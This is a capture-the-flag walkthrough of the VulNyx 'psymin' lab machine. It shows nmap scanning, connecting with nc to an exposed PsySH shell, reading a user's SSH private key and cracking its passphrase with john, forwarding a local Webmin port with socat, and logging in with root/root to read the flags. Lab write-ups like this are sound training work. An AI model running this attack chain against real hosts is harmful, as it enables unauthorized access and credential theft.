---
created: 2024-12-16T02:00
updated: 2024-12-16T02:30
---

[VulNyx | Cybersecurity Learning & Practice Platform](https://vulnyx.com/)

## nmap and bash

Simple shell access?

```bash
┌──(root㉿kumo-legion)-[/mnt/c/Users/zy]
└─# nmap 192.168.2.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 02:00 EST
Nmap scan report for 192.168.2.26
Host is up (0.0034s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds

┌──(root㉿kumo-legion)-[/mnt/c/Users/zy]
└─# nc 192.168.2.26 3000
Psy Shell v0.12.4 (PHP 8.2.20 — cli) by Justin Hileman
New version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.7)
> ls -la
ls -la
WARNING: terminal is not fully functional
Press RETURN to continue !bash

!bash
bash: no se puede establecer el grupo de proceso de terminal (309): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
alfred@psymin:~$ ls
ls
psysh  user.txt
alfred@psymin:~$ cat user.txt
cat user.txt
e12853c615d191efce15c726a0684754
```

## ssh key

```
alfred@psymin:~$ cd .ssh
cd .ssh
alfred@psymin:~/.ssh$ ls
ls
authorized_keys  id_rsa
alfred@psymin:~/.ssh$ cat id_rsa
```

```bash
ssh -i psymin_id_rsa alfred@192.168.2.26
Enter passphrase for key 'psymin_id_rsa'
```

Hrm, its password locked.
## john crack

```bash
ssh2john psymin_id_rsa > tmp_id_rsa
john tmp_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alfredo          (psymin_id_rsa)
1g 0:00:00:06 DONE (2024-12-16 02:07) 0.1564g/s 140.2p/s 140.2c/s 140.2C/s football1..ilovegod
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password!

## local port scan

```bash
alfred@psymin:~$ ls
psysh  user.txt
alfred@psymin:~$ ss -lntup
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port
udp      UNCONN    0          0                    0.0.0.0:68                 0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:10000              0.0.0.0:*
tcp      LISTEN    0          5                    0.0.0.0:3000               0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:10000              0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
tcp      LISTEN    0          511                  0.0.0.0:80                 0.0.0.0:*
tcp      LISTEN    0          128                     [::]:22                    [::]:*
tcp      LISTEN    0          511                     [::]:80                    [::]:*
alfred@psymin:~$
```

Expose it.

```bash
alfred@psymin:~$ socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:10000
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1734333522/2024/12/b0b03a598bce0c484203f3a0b0946fe4.png)

Nice.
## webmin

`root` / `root` worked.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1734334240/2024/12/c9eb3f733869f41518ca7fe41f293880.png)

```bash
> ls
root.txt
> cat root.txt
8968662c86171f7a5afe387a949fe665
```

And that's it.
